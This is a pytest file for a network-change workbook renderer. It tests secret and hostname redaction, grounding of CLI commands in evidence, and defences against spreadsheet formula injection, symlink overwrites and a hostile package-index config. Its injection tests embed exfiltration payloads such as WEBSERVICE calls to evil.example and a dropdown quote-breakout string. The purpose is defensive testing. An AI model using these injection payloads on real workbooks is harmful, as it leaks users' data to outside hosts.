"""#484 review fixes: redaction leaks, grounding false positives, formula injection."""

import importlib.util
import json
import os
import re
import shutil
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

_SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
sys.path.insert(0, str(_SCRIPTS))

import redact_spec  # noqa: E402
import render_workbook  # noqa: E402
import workbook_grounding  # noqa: E402

LEAKS = {
    "ip ospf message-digest-key 1 md5 7 SuperSecret1": "SuperSecret1",
    "snmp-server user u1 G v3 auth sha AuthPass123 priv aes 128 PrivPass123": "AuthPass123|PrivPass123",
    "wpa-psk ascii 0 WifiPass!": "WifiPass!",
    "api_key=notreal1": "notreal1",
    "username admin secret 10 $6$salt$hashvalue": "$6$salt$hashvalue",
    "set passwd ENC SH2abcdef": "SH2abcdef",
    "set psksecret ENC Zm9vYmFy": "Zm9vYmFy",
    "snmp-server user u2 net auth sha 0x1a2b3c4d5e6f7a8b priv aes-128 0x9f8e7d6c5b4a3928 localizedkey":
        "0x1a2b3c4d5e6f7a8b|0x9f8e7d6c5b4a3928",
    "neighbor 2001:DB8::2 remote-as 65001": "2001:DB8::2",
    "ipv6 address fe80::1 link-local": "fe80::1",
    "ipv6 address 2001:db8:10::1/64": "2001:db8:10::1|::1/64",
    "description Uplink to NYC-DIST-02": "NYC-DIST-02",
    "snmp-server location Chicago DC1": "Chicago DC1",
    "copy running to DC2-SPINE-03 serial FOC1234X5YZ": "DC2-SPINE-03|FOC1234X5YZ",
    "ssh admin@core-sw-01": "core-sw-01",
}


@pytest.fixture(autouse=True)
def _private_home(tmp_path, monkeypatch):
    monkeypatch.setenv("DAMIRA_LOG_DIR", str(tmp_path / "logs"))
    monkeypatch.setenv("HOME", str(tmp_path / "home"))


def test_redact_removes_vendor_secrets_ipv6_and_free_text_hosts():
    spec = {"title": "t", "sheets": [{"name": "S", "headers": ["Command"],
                                      "rows": [{"command": line} for line in LEAKS]}]}
    out, _ = redact_spec.redact(spec)
    for (line, secrets), row in zip(LEAKS.items(), out["sheets"][0]["rows"]):
        for secret in secrets.split("|"):
            assert secret not in row["command"], f"{line!r} -> {row['command']!r}"
    # Commands stay readable: the verb survives.
    assert out["sheets"][0]["rows"][0]["command"].startswith("ip ospf message-digest-key")


def test_redact_scrubs_sheet_names_labels_dropdowns_and_formulas():
    spec = {"title": "Upgrade nyc-core-rtr-01",
            "summary_fields": {"Hostname": "nyc-core-rtr-01"},
            "key_metrics": {"nyc-core-rtr-01 uptime": "300d"},
            "sheets": [{"name": "nyc-core-rtr-01 steps", "headers": ["Device", "Total"],
                        "rows": [{"device": "nyc-core-rtr-01"}],
                        "dropdowns": {"Device": "nyc-core-rtr-01,other"},
                        "formulas": {"Total": '=IF(A2="nyc-core-rtr-01",1,0)'}}]}
    spec["sheets"][0]["headers"].append("nyc-core-rtr-01 state")
    spec["sheets"][0]["rows"][0]["nyc-core-rtr-01_state"] = "up"
    out, _ = redact_spec.redact(spec)
    assert "nyc-core-rtr-01" not in repr(out)
    sheet = out["sheets"][0]
    assert sheet["headers"][:2] == ["Device", "Total"]
    renamed = sheet["headers"][2]
    assert sheet["rows"][0][renamed.lower().replace(" ", "_")] == "up", "row follows its header"


@pytest.mark.parametrize("command", [
    "write erase",
    "format bootflash:",
    "install add file bootflash:cat9k_iosxe.17.06.05.SPA.bin activate commit",
    "install rollback to base",
    "install add file flash:cat9k_iosxe.17.09.05.SPA.bin activate issu commit",
])
def test_grounding_does_not_fuzzy_match_unbacked_or_wrong_commands(command):
    evidence = ("write memory before reload. install add file bootflash:cat9k_iosxe.17.09.05.SPA.bin "
                "activate commit, then install remove inactive. install rollback to committed")
    spec = {"sheets": [{"name": "S", "headers": ["CLI Command"], "rows": [{"cli_command": command}]}]}
    tagged, unverified, _ = workbook_grounding.ground_spec(spec, evidence)
    assert tagged["sheets"][0]["rows"][0]["grounding"] == "UNVERIFIED"
    exact = {"sheets": [{"name": "S", "headers": ["CLI Command"], "rows": [
        {"cli_command": "install add file bootflash:cat9k_iosxe.17.09.05.SPA.bin activate commit"}]}]}
    assert workbook_grounding.ground_spec(exact, evidence)[1] == 0


def test_grounding_skips_prose_but_checks_command_bearing_columns():
    spec = {"sheets": [{"name": "S", "headers": ["#", "Check", "CLI Command", "Rollback"], "rows": [
        {"check": "Record stack member priorities", "cli_command": "show version",
         "rollback": "Re-cable old switch"},
        {"check": "show switch", "cli_command": "show version", "rollback": "install rollback to committed"},
    ]}]}
    tagged, unverified, checked = workbook_grounding.ground_spec(spec, "show version")
    rows = tagged["sheets"][0]["rows"]
    assert rows[0]["grounding"] == "source-matched"
    assert rows[1]["grounding"] == "UNVERIFIED"
    assert (unverified, checked) == (2, 4)


@pytest.mark.skipif(shutil.which("uv") is None and importlib.util.find_spec("openpyxl") is None,
                    reason="needs openpyxl or uv")
def test_model_text_never_becomes_a_formula(tmp_path):
    spec = {
        "title": '=HYPERLINK("http://evil.example/x","c")',
        "summary_fields": {"=1+1": "x"},
        "key_metrics": {'=WEBSERVICE("http://evil.example/")': "1"},
        "sheets": [{"name": "S", "headers": ["=2+2", "A", "B", "Evil", "Sum"],
                    "rows": [{"a": "1", "b": "2"}],
                    "formulas": {"Evil": '=WEBSERVICE("http://evil.example/?"&B2)', "Sum": "={A}+{B}"}}]}
    (tmp_path / "workbook.json").write_text(json.dumps(spec), encoding="utf-8")
    env = {**os.environ, "DAMIRA_LOG_DIR": str(tmp_path / "logs"), "HOME": str(tmp_path / "home")}
    proc = subprocess.run([sys.executable, str(_SCRIPTS / "render_workbook.py"), str(tmp_path / "workbook.json")],
                          capture_output=True, text=True, env=env, timeout=240)
    assert proc.returncode == 0, proc.stderr
    with zipfile.ZipFile(tmp_path / "workbook.xlsx") as z:
        summary = z.read("xl/worksheets/sheet1.xml").decode()
        data = z.read("xl/worksheets/sheet2.xml").decode()
    assert "<f>" not in summary
    assert re.findall(r"<f>(.*?)</f>", data) == ["B2+C2"]


# --- second review pass: quoted values, modifier words, vendor keywords ---------------
LEAKS_2 = {
    'set security ike policy P pre-shared-key ascii-text "Hunter2Psk"': "Hunter2Psk",
    "set security ike policy P pre-shared-key hexadecimal-text 0badc0ffee": "0badc0ffee",
    "set system root-authentication plain-text-password-value R00tPw": "R00tPw",
    'username admin password "Cisco123"': "Cisco123",
    'set snmp community "Publ1c"': "Publ1c",
    "key 'abc123'": "abc123",
    "username bob password 12": "12",
    "radius-server shared-secret RadSec1": "RadSec1",
    "snmp-server host 10.2.2.2 traps version 2c PubC0mm": "PubC0mm",
    "set snmp v3 usm local-engine user u1 authentication-sha authentication-password Plain123": "Plain123",
    "set snmp v3 usm local-engine user u1 privacy-aes128 privacy-password Plain456": "Plain456",
    "security wpa psk set-key ascii 0 WlanPass1": "WlanPass1",
    "pre-shared-key local Loc1 remote Rem1": "Loc1|Rem1",
    "snmp-server user admin network-admin auth md5 0x1234abcd priv 0xdeadbeef localizedkey":
        "0x1234abcd|0xdeadbeef",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJl": "eyJhbGciOiJIUzI1NiJ9",
    "aws_access_key_id " + "AKIA" + "ABCDEFGHIJKLMNOP": "ABCDEFGHIJKLMNOP",  # split: not a real key
    "set system host-name nyc-rtr1": "nyc-rtr1",
    "switchname DCSPINE01": "DCSPINE01",
    "ssh to nyc-rtr1 and CORE1-NYC": "nyc-rtr1|CORE1-NYC",
    "ip domain name acme.local": "acme.local",
    "ping rtr01.dc2.acme-corp.com": "rtr01.dc2.acme-corp.com",
}


def test_redact_quoted_modifier_keyword_and_identifier_leaks():
    spec = {"title": "t", "sheets": [{"name": "S", "headers": ["Command"],
                                      "rows": [{"command": line} for line in LEAKS_2]}]}
    out, counts = redact_spec.redact(spec)
    for (line, secrets), row in zip(LEAKS_2.items(), out["sheets"][0]["rows"]):
        for secret in secrets.split("|"):
            assert secret not in row["command"], f"{line!r} -> {row['command']!r}"
    assert counts.get("SECRET", 0) >= 15
    # Readability: keys, verbs, interfaces and ciphers survive.
    kept = {"key chain K key 1": "key 1", "interface Port-channel10": "Port-channel10",
            "crypto ipsec transform-set T esp-aes-256 esp-sha-hmac": "esp-aes-256",
            "address-family ipv4-unicast": "ipv4-unicast",
            "copy cat9k_iosxe.17.09.05.SPA.bin flash:": "cat9k_iosxe.17.09.05.SPA.bin"}
    spec = {"title": "t", "sheets": [{"name": "S", "headers": ["Command"],
                                      "rows": [{"command": line} for line in kept]}]}
    out, _ = redact_spec.redact(spec)
    for (line, word), row in zip(kept.items(), out["sheets"][0]["rows"]):
        assert word in row["command"], f"{line!r} -> {row['command']!r}"


def test_redact_scrubs_auto_id_prefix_and_rendered_preview(tmp_path):
    spec = {"title": "t", "sheets": [{"name": "S", "headers": ["Step", "Command"], "auto_id_prefix": "ACME-NYC",
                                      "rows": [{"command": 'username admin password "Cisco123"'}]}]}
    (tmp_path / "workbook.json").write_text(json.dumps(spec), encoding="utf-8")
    env = {**os.environ, "DAMIRA_LOG_DIR": str(tmp_path / "logs"), "HOME": str(tmp_path / "home")}
    proc = subprocess.run([sys.executable, str(_SCRIPTS / "render_workbook.py"), str(tmp_path / "workbook.json"),
                           "--redact", "--out-dir", str(tmp_path / "share")],
                          capture_output=True, text=True, env=env, timeout=120)
    assert proc.returncode == 0, proc.stderr
    html = (tmp_path / "share" / "index.html").read_text(encoding="utf-8")
    assert "Cisco123" not in html and "ACME-NYC" not in html


@pytest.mark.parametrize("command", [
    "shutdown",                                  # evidence only says `no shutdown`
    "write erase",                               # words scattered, order differs
    "no boot system bootflash:packages.conf",    # negation the evidence never shows
    "install add file bootflash:cat9k_iosxe.17.09.05.SPA.bin activate",  # commit dropped
])
def test_grounding_treats_negation_order_and_truncation_as_meaning(command):
    evidence = ("Use 'no shutdown' on the interface. Enter write memory to save. See the format/erase "
                "guidance. There is no boot system required. boot system bootflash:packages.conf\n"
                "install add file bootflash:cat9k_iosxe.17.09.05.SPA.bin activate commit")
    spec = {"sheets": [{"name": "S", "headers": ["CLI Command"], "rows": [{"cli_command": command}]}]}
    assert workbook_grounding.ground_spec(spec, evidence)[1] == 1
    for ok in ("no shutdown", "write memory", "boot system bootflash:packages.conf"):
        spec["sheets"][0]["rows"][0]["cli_command"] = ok
        assert workbook_grounding.ground_spec(spec, evidence)[1] == 0, ok


@pytest.mark.parametrize("command", ["utils system switch-version", "config system global", "edit port1",
                                     "admin install rollback to committed", "file delete /recursive old"])
def test_mixed_columns_check_vendor_cli_verbs(command):
    assert workbook_grounding.looks_like_cli(command)


@pytest.mark.skipif(shutil.which("uv") is None and importlib.util.find_spec("openpyxl") is None,
                    reason="needs openpyxl or uv")
def test_dropdown_quote_cannot_break_out_into_a_formula(tmp_path):
    spec = {"title": "t", "sheets": [{"name": "S", "headers": ["Status"], "rows": [{"status": "Pending"}],
                                      "dropdowns": {"Status": 'Pending,Done"&WEBSERVICE("http://evil.example/x")&"'}}]}
    (tmp_path / "workbook.json").write_text(json.dumps(spec), encoding="utf-8")
    env = {**os.environ, "DAMIRA_LOG_DIR": str(tmp_path / "logs"), "HOME": str(tmp_path / "home")}
    proc = subprocess.run([sys.executable, str(_SCRIPTS / "render_workbook.py"), str(tmp_path / "workbook.json")],
                          capture_output=True, text=True, env=env, timeout=240)
    assert proc.returncode == 0, proc.stderr
    with zipfile.ZipFile(tmp_path / "workbook.xlsx") as z:
        data = z.read("xl/worksheets/sheet2.xml").decode()
    formula1 = re.findall(r"<formula1>(.*?)</formula1>", data)
    assert formula1 and all(f.count("&quot;") + f.count('"') == 2 for f in formula1), formula1
    # The text may remain, but only as literal list-item text inside the one string.
    assert 'showErrorMessage="1"' in data


def test_remote_payload_neutralises_formulas_before_upload():
    spec = {"title": "=1+1", "sheets": [{"name": "S", "headers": ["A", "Evil", "Sum"],
                                         "rows": [{"a": '=WEBSERVICE("http://evil.example/")'}],
                                         "dropdowns": {"A": 'x"&WEBSERVICE("u")&"'},
                                         "formulas": {"Evil": '=WEBSERVICE("http://evil.example/")',
                                                      "Sum": "={A}+1"}}]}
    safe = render_workbook.remote_payload(spec)
    sheet = safe["sheets"][0]
    assert not safe["title"].startswith("=")
    assert not sheet["rows"][0]["a"].startswith("=")
    assert "Evil" not in sheet["formulas"] and sheet["formulas"]["Sum"] == "={A}+1"
    assert '"' not in sheet["dropdowns"]["A"]


def test_gui_and_manual_steps_are_not_graded_as_commands():
    spec = {"sheets": [{"name": "S", "headers": ["CLI Command"], "rows": [
        {"cli_command": "GUI: OS Admin > Software Upgrades"},
        {"cli_command": "Manual: call between two registered phones"},
        {"cli_command": "utils system switch-version"}]}]}
    tagged, unverified, checked = workbook_grounding.ground_spec(spec, "utils system switch-version")
    assert (unverified, checked) == (0, 1)
    assert "grounding" not in tagged["sheets"][0]["rows"][0]


# --- fix round (PR #504 verification): uv config, prefix/placeholder grounding, vendor secrets ---
def test_uv_fallback_ignores_workspace_config(tmp_path, monkeypatch):
    (tmp_path / ".python-version").write_text(str(tmp_path / "evil-python"), encoding="utf-8")
    (tmp_path / "uv.toml").write_text('index-url = "http://evil.example/simple"\n', encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv(render_workbook._REEXEC_ENV, raising=False)
    monkeypatch.setattr(render_workbook.shutil, "which", lambda _: "/usr/bin/uv")
    seen = {}

    def fake_run(cmd, cwd=None, env=None, timeout=None):
        seen.update(cmd=cmd, cwd=cwd, env=env)
        return subprocess.CompletedProcess(cmd, 0)

    monkeypatch.setattr(render_workbook.subprocess, "run", fake_run)
    assert render_workbook._reexec_with_uv(["workbook.json"]) == 0
    cmd = seen["cmd"]
    assert "--no-config" in cmd and cmd[cmd.index("--python") + 1] == sys.executable
    assert seen["cwd"] and Path(seen["cwd"]).resolve() != tmp_path.resolve()
    assert seen["env"][render_workbook._CWD_ENV] == os.getcwd()


@pytest.mark.parametrize("command,evidence", [
    ("commit", "Run commit check first."),
    ("commit", "commit confirmed 5"),
    ("commit confirmed", "commit confirmed 5 then commit"),
    ("clear ip bgp *", "clear ip bgp * soft in"),
    ("reload", "reload in 10"),
    ("reload", "Save the config before reload."),
    ("delete [OLD IMAGE]", "Delete the old image to free space; delete it only after the upgrade."),
    ("format [FILESYSTEM]", "You may need to format the filesystem."),
    ("erase <fs>", "Never erase anything here."),
    ("[OLD IMAGE]", "delete flash:old.bin"),
    ("<a> <b>", "anything at all"),
    ("show version 11.1.3", "show version 11.1.3.1"),
    ("reload", "reload at 02:00"),
    ("request system reboot", "request system reboot at 02:00"),
    ("commit", 'commit at "02:00"'),
    ("reload", "reload on 12 March"),
])
def test_grounding_rejects_prefix_prose_verb_and_placeholder_only_cells(command, evidence):
    spec = {"sheets": [{"name": "S", "headers": ["CLI Command"], "rows": [{"cli_command": command}]}]}
    tagged, unverified, _ = workbook_grounding.ground_spec(spec, evidence)
    assert unverified == 1, command
    assert tagged["sheets"][0]["rows"][0]["grounding"] == "UNVERIFIED"


def test_grounding_still_matches_real_commands_with_placeholders():
    evidence = ("1. commit confirmed 5\n- delete flash:cat9k_old.bin\n`reload in 10`\n"
                "show ip bgp summary vrf blue\nwrite memory before reload.\n"
                "Run `copy running-config startup-config` on the core switch.")
    for command in ("commit confirmed 5", "delete [OLD IMAGE]", "reload in 10", "show ip bgp summary",
                    "write memory", "copy running-config startup-config"):
        assert workbook_grounding.grounded_in(command, workbook_grounding._norm(evidence)), command


LEAKS_3 = {
    # Split literals: fake values, kept out of the repo's secret scanner.
    "set network ike gateway GW authentication pre-shared-key key -AQ==" + "c2VjcmV0UHNrMQ==": "c2VjcmV0UHNrMQ==",
    "<pre-shared-key><key>-AQ==c2VjcmV0UHNrMg==</key></pre-shared-key>": "-AQ==c2VjcmV0UHNrMg==",
    "<phash>$5$saltsalt$hashhash</phash>": "hashhash",
    "set deviceconfig system snmp-setting access-setting version v2c snmp-community-string PanComm1": "PanComm1",
    "<snmp-community-string>PanComm2</snmp-community-string>": "PanComm2",
    "config radius auth add 1 10.1.1.10 1812 ascii AireRad1": "AireRad1",
    "config radius acct add 2 10.1.1.11 1813 ascii AireRad2": "AireRad2",
    "export DAMIRA_API_KEY=damira_sk_notreal123": "damira_sk_notreal123",
    "curl -u admin" + ":CurlPw1 https://x": "CurlPw1",
    "https://bob:UrlPw1@10.9.9.9/api": "UrlPw1",
    "ansible_ssh_pass: AnsPw1": "AnsPw1",
    "-----BEGIN RSA PRIVATE KEY-----\nMIIEpBody\n-----END RSA PRIVATE KEY-----": "MIIEpBody",
}


def test_redact_panos_snmp_aireos_and_env_secrets():
    spec = {"title": "t", "sheets": [{"name": "S", "headers": ["Command"],
                                      "rows": [{"command": line} for line in LEAKS_3]}]}
    out, _ = redact_spec.redact(spec)
    for (line, secret), row in zip(LEAKS_3.items(), out["sheets"][0]["rows"]):
        assert secret not in row["command"], f"{line!r} -> {row['command']!r}"
    rows = [r["command"] for r in out["sheets"][0]["rows"]]
    assert rows[1] == "<pre-shared-key><key>[REDACTED]</key></pre-shared-key>", "XML tags survive"
    assert rows[2].endswith("</phash>")


def test_redact_prerequisite_column_is_not_an_identifier():
    spec = {"sheets": [{"name": "S", "headers": ["Prerequisite", "Status", "Mgmt Host"],
                        "rows": [{"prerequisite": "Backup done", "status": "Complete", "mgmt_host": "edge7"}]}]}
    row = redact_spec.redact(spec)[0]["sheets"][0]["rows"][0]
    assert (row["prerequisite"], row["status"]) == ("Backup done", "Complete")
    assert row["mgmt_host"] != "edge7"


def test_outputs_replace_a_planted_symlink_instead_of_following_it(tmp_path):
    victim = tmp_path / "victim.txt"
    victim.write_text("keep me", encoding="utf-8")
    change = tmp_path / "chg"
    change.mkdir()
    (change / "workbook.json").write_text(json.dumps(
        {"title": "t", "sheets": [{"name": "S", "headers": ["A"], "rows": [{"a": "1"}]}]}), encoding="utf-8")
    (change / "index.html").symlink_to(victim)
    render_workbook.render(change / "workbook.json", xlsx=False)
    assert victim.read_text(encoding="utf-8") == "keep me"
    assert not (change / "index.html").is_symlink()


@pytest.mark.parametrize("command,evidence", [
    ("clear ip bgp [NEIGHBOR]", "clear ip bgp 10.1.1.1 soft in"),
    ("install add file [IMAGE]", "install add file bootflash:cat9k.bin activate commit prompt-level none"),
    ("request system software add [PKG]", "request system software add /var/tmp/x.tgz no-validate reboot"),
    ("request system software add [PKG] reboot", "request system software add /var/tmp/x.tgz no-validate reboot"),
])
def test_trailing_placeholder_takes_one_value_then_the_command_ends(command, evidence):
    assert not workbook_grounding.grounded_in(command, workbook_grounding._norm(evidence)), command


def test_trailing_placeholder_matches_when_the_command_ends_after_the_value():
    for command, evidence in (("clear ip bgp [NEIGHBOR]", "clear ip bgp 10.1.1.1"),
                              ("clear ip bgp [NEIGHBOR]", "Run clear ip bgp 10.1.1.1 to reset it."),
                              ("show ip bgp neighbors [IP]", "show ip bgp neighbors 10.1.1.1 advertised-routes")):
        assert workbook_grounding.grounded_in(command, workbook_grounding._norm(evidence)), command


@pytest.mark.parametrize("command,evidence", [
    ("write erase", "write erase is dangerous, do not run"),
    ("write erase", "Never run: write erase"),
    ("reload", "Do not: reload"),
    ("reload", "Warning: reload will drop traffic"),
    ("format flash:", "Warning: format flash: erases everything"),
    ("erase startup-config", "1. erase startup-config only if instructed"),
    ("write erase", "Avoid write erase."),
    ("request system zeroize", "WARNING: never run request system zeroize on production."),
])
def test_commands_quoted_in_warnings_are_not_evidence(command, evidence):
    assert not workbook_grounding.grounded_in(command, workbook_grounding._norm(evidence)), command


def test_grounding_stays_fast_on_one_huge_evidence_line():
    import time
    corpus = workbook_grounding._norm("show ip route " * 20000)
    started = time.monotonic()
    for cell in ("route [X] zzz", "reload", "show ip route [X] zzz"):
        workbook_grounding.grounded_in(cell, corpus)
    assert time.monotonic() - started < 3


def test_redact_prose_and_cli_password_forms():
    leaks = {"the enable password is Hunter2": "Hunter2",
             "Community string: CommProse1": "CommProse1",
             "SNMP community is CommProse2": "CommProse2",
             "Authorization: Basic YWRtaW46c2VjcmV0": "YWRtaW46c2VjcmV0",
             "mysql -u root -pMyPw123 db": "MyPw123",
             "sshpass -p SshPw1 ssh admin@x": "SshPw1"}
    spec = {"title": "t", "sheets": [{"name": "S", "headers": ["Details"],
                                      "rows": [{"details": line} for line in leaks]}]}
    out, _ = redact_spec.redact(spec)
    for (line, secret), row in zip(leaks.items(), out["sheets"][0]["rows"]):
        assert secret not in row["details"], f"{line!r} -> {row['details']!r}"
    assert out["sheets"][0]["rows"][0]["details"] == "the enable password is [REDACTED]"


def test_redact_switch_model_column_is_not_an_identifier():
    spec = {"sheets": [{"name": "S", "headers": ["Switch Model", "Switch Name"],
                        "rows": [{"switch_model": "C9300-48P", "switch_name": "edge7"}]}]}
    row = redact_spec.redact(spec)[0]["sheets"][0]["rows"][0]
    assert row["switch_model"] == "C9300-48P" and row["switch_name"] != "edge7"


def test_outputs_follow_the_umask(tmp_path):
    change = tmp_path / "chg"
    change.mkdir()
    (change / "workbook.json").write_text(json.dumps(
        {"title": "t", "sheets": [{"name": "S", "headers": ["A"], "rows": [{"a": "1"}]}]}), encoding="utf-8")
    old = os.umask(0o022)
    try:
        render_workbook.render(change / "workbook.json", xlsx=False)
    finally:
        os.umask(old)
    assert (change / "index.html").stat().st_mode & 0o777 == 0o644


def test_a_directory_at_the_output_path_exits_cleanly(tmp_path, capsys):
    change = tmp_path / "chg"
    change.mkdir()
    (change / "workbook.json").write_text(json.dumps(
        {"title": "t", "sheets": [{"name": "S", "headers": ["A"], "rows": [{"a": "1"}]}]}), encoding="utf-8")
    (change / "index.html").mkdir()
    assert render_workbook.main([str(change / "workbook.json"), "--html-only"]) == 1
    assert "Traceback" not in capsys.readouterr().err


@pytest.mark.parametrize("command,evidence", [
    ("delete firewall family inet filter PROTECT-RE term ALLOW-SSH",
     "delete firewall family inet filter PROTECT-RE term ALLOW-SSH from source-address 10.0.0.0/8"),
    ("delete policy-options policy-statement P term T", "delete policy-options policy-statement P term T then community add C"),
    ("delete policy-options policy-statement P term T",
     "delete policy-options policy-statement P term T from route-filter 10.0.0.0/8 exact"),
    ("deactivate policy-options policy-statement P term T",
     "deactivate policy-options policy-statement P term T to neighbor 10.1.1.1"),
])
def test_junos_from_then_to_are_command_words_not_prose(command, evidence):
    assert not workbook_grounding.grounded_in(command.lower(), workbook_grounding._norm(evidence)), command
    assert workbook_grounding.grounded_in(evidence.lower(), workbook_grounding._norm(evidence))
    # Prose "to"/"then" still ends a command that is not a Junos configuration verb.
    assert workbook_grounding.grounded_in("write memory", workbook_grounding._norm("write memory to save it"))
